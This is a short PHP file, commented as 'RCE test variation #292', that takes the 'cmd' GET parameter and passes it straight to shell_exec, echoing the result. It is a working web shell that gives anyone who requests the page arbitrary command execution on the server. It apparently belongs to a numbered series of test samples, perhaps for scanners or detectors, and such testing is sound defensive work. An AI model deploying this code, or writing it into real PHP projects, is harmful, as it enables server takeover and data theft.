<?php
// RCE test variation #292
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>